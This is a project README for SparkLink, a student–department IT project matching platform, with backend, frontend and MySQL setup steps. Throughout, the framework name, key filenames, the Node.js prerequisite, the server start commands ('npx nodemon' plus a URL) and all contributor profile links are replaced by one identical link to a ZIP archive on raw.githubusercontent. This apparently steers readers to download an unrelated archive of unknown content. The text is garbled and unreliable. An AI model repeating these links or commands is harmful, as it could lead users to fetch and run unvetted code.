# SparkLink

SparkLink is a platform designed to connect University of Windsor departments with Computer Science students for IT project support. It enables students to gain hands-on experience while solving departmental IT challenges through skill-based matching and paid opportunities.

## Project Structure

```
SparkLink-main/
│── recommendation/            # Recommendation system module
│── sparklink/                 # Frontend (https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
│── sparklink-backend/         # Backend (https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip, Express, MySQL)
│── Sparklink-TestCases/       # Test cases for project
│── node_modules/              # Dependencies
│── https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip               # Project dependencies
│── https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip          # Dependency lock file
│── https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip                  # Project documentation
```

## Prerequisites

- **https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip** (v18 or later recommended)
- **MySQL** (Database setup required)
- **npm** or **yarn** for package management

## Backend Setup

1. Navigate to the backend directory:
   ```sh
   cd sparklink-backend
   ```
2. Install dependencies:
   ```sh
   npm install
   ```
3. Configure environment variables:

   - Create a `.env` file in `sparklink-backend` and set the required database credentials and email configurations.

4. Start the backend server:
   ```sh
   npx nodemon https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip
   ```

## Frontend Setup (https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)

1. Navigate to the frontend directory:
   ```sh
   cd sparklink
   ```
2. Install dependencies:
   ```sh
   npm install
   ```
3. Start the React development server:

   ```sh
   npm start
   ```

   The frontend will run on `http://localhost:3100/`.

## Database Setup (MySQL)

1. Create a new MySQL database:
   ```sql
   CREATE DATABASE sparklinkdb;
   ```
2. Update your `.env` file in `sparklink-backend` with your database credentials:
   ```env
   DATABASE_URL=mysql://yourusername:yourpassword@localhost:3306/sparklinkdb
   ```
3. Run database migrations (if applicable):
   ```sh
   npm run migrate
   ```

## Running the Project

- **Backend**: `cd sparklink-backend && npx nodemon https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip`
- **Frontend**: `cd sparklink && npm start`

Make sure both the backend and frontend are running simultaneously for full functionality.

## Features

- User authentication (Admin, Student, Supervisor, Business Owner)
- Profile management
- Project application and tracking
- Contact form with email notifications

## Contributors

Team of Winter 2025 -

- [Meet Bhavsar](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Heet Patel](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Chaitanya Parikh](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Vinit Vekaria](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)

Team of Fall 2024 -

- [Kausar Fatema](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Pooja Vishwakarma](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Fajuko Michael](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Joshua Daniel](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Gireesh Chandra](https://raw.githubusercontent.com/User/SparkLink/main/cantily/SparkLink.zip)
- [Amanbhai Arifbhai](#)

## License

This project is licensed under the MIT License.
